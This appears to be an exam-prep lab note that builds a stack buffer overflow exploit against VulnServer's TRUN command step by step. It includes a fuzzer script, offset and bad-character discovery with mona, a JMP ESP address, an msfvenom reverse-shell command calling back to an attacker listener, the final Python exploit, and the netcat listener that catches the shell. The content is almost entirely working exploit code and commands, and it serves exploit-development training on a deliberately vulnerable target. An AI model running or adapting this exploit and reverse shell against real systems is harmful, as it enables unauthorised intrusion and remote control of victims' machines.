# Full Worked Example — VulnServer TRUN (stack BOF)

The point of this file: **see one exploit built end to end, once.** Every command,
every value, in order. Do it yourself in the lab, then hide this and redo from memory.
Target: VulnServer's `TRUN` command (a textbook stack buffer overflow, DEP off).

Assume victim `192.168.1.50`, VulnServer on `9999`, WinDbg attached, Kali attacker.

---

## Step 0 — attach and see it running
On victim: run `vulnserver.exe`. In WinDbg: `File > Attach to Process > vulnserver`, then
`g` to let it run. From Kali confirm you can talk to it:
```bash
nc -vn 192.168.1.50 9999      # you should get a "Welcome to Vulnerable Server!" banner
```
TRUN takes an argument: `TRUN /.:/ <data>`. The overflow is in that data.

## Step 1 — fuzz to a crash
```python
#!/usr/bin/env python3
import socket, time
ip, port = "192.168.1.50", 9999
size = 100
while size < 5000:
    try:
        s = socket.socket(); s.connect((ip, port)); s.recv(1024)
        print(f"[*] TRUN with {size} bytes")
        s.send(b"TRUN /.:/ " + b"A"*size)
        s.recv(1024); s.close()
    except Exception:
        print(f"[!] crashed around {size} bytes"); break
    size += 200; time.sleep(0.5)
```
It dies around ~2000–2100 bytes. In WinDbg you'll see an access violation. `r` → **EIP is
41414141**. Classic stack BOF. Pick a clean crash length: **2000**.

## Step 2 — offset to EIP
Send a cyclic pattern instead of A's:
```bash
msf-pattern_create -l 2000
```
Put that in `b"TRUN /.:/ " + pattern`, send, crash. Read EIP (say `386F4337`), then:
```bash
msf-pattern_offset -l 2000 -q 386F4337
# -> Exact match at offset 2003
```
Or just: `!py mona findmsp` → "EIP contains normal pattern ... offset 2003".
**OFFSET = 2003.**

## Step 3 — confirm EIP control
```python
payload = b"TRUN /.:/ " + b"A"*2003 + b"BBBB" + b"C"*(2000-2007)
```
Crash → `r` shows **eip=42424242**. You own it. Note ESP:
```
r esp          ; e.g. 018FF9C8
dd esp         ; your "CCCC" bytes -> shellcode goes here
```

## Step 4 — find bad characters
```
!py mona bytearray -b "\x00"
```
Put the generated array right after BBBB (where ESP points), crash, then:
```
!py mona compare -f c:\mona\vulnserver\bytearray.bin -a <esp_addr>
```
For TRUN, only `\x00` is bad. mona says "unmodified". **BADCHARS = \x00**.

## Step 5 — find JMP ESP
```
!py mona jmp -r esp -cpb "\x00"
```
essfunc.dll (VulnServer's own DLL, no ASLR/SafeSEH) yields e.g. **0x625011AF** (`jmp esp`).
Verify: `u 625011af` → `jmp esp`. Little-endian into the buffer: `\xaf\x11\x50\x62`.

## Step 6 — generate shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 \
  -f python -v shellcode -b "\x00" EXITFUNC=thread
```
Copy the `shellcode = b"..."` output.

## Step 7 — final exploit
```python
#!/usr/bin/env python3
import socket, struct
ip, port = "192.168.1.50", 9999

offset  = 2003
jmp_esp = struct.pack("<I", 0x625011af)     # essfunc.dll jmp esp
nops    = b"\x90" * 16                        # landing pad + decoder breathing room

shellcode =  b""                              # <-- paste msfvenom bytes
shellcode += b""

buf  = b"TRUN /.:/ "
buf += b"A"*offset
buf += jmp_esp
buf += nops
buf += shellcode
buf += b"C"*(2000 - (offset+4+len(nops)+len(shellcode)))   # keep total ~stable

s = socket.socket(); s.connect((ip, port)); s.recv(1024)
s.send(buf); s.close()
print("[+] fired")
```

## Step 8 — catch the shell
```bash
# On Kali, BEFORE firing:
nc -lvnp 443
# run the exploit -> connection back -> whoami
```

---

## Debug it like a pro (before trusting the shell)
Prove control first with a breakpoint payload:
```python
shellcode = b"\xcc" * 4          # int3 — should break in WinDbg exactly at ESP
```
If WinDbg breaks on `int3` right where ESP pointed, your offset + JMP ESP are correct and
the ONLY remaining variable is the real shellcode (usually a badchar issue). This split
saves hours.

## What each other VulnServer command teaches
| Command | Bug class | Practice with |
|---|---|---|
| TRUN | stack BOF | this file |
| GMON | SEH overflow | `00-methodology/seh-playbook.md` |
| GTER / KSTET | space-constrained / staging | egghunter playbook |
| LTER | more SEH / variations | seh playbook |

Do TRUN until it's boring. Then GMON. That covers ~70% of the OSED core reflexes.
